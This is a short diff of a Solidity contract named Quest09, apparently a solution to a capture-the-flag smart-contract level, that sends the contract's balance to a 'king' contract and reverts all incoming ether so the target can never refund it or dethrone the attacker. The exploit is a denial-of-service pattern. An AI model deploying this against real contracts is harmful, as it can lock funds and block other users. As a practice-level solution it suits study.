@@ -7,10 +7,13 @@ contract Quest09 is Ownable {
     constructor() payable {}
 
     function attack(address kingAddress) public onlyOwner {
-        kingAddress.call{value: address(this).balance}("");
+        (bool result, ) = kingAddress.call{value: address(this).balance}("");
+        if (result) {
+            result;
+        }
     }
 
-    fallback() external payable {
+    receive() external payable {
         revert("I don't accept any ether sends to me");
     }
 }
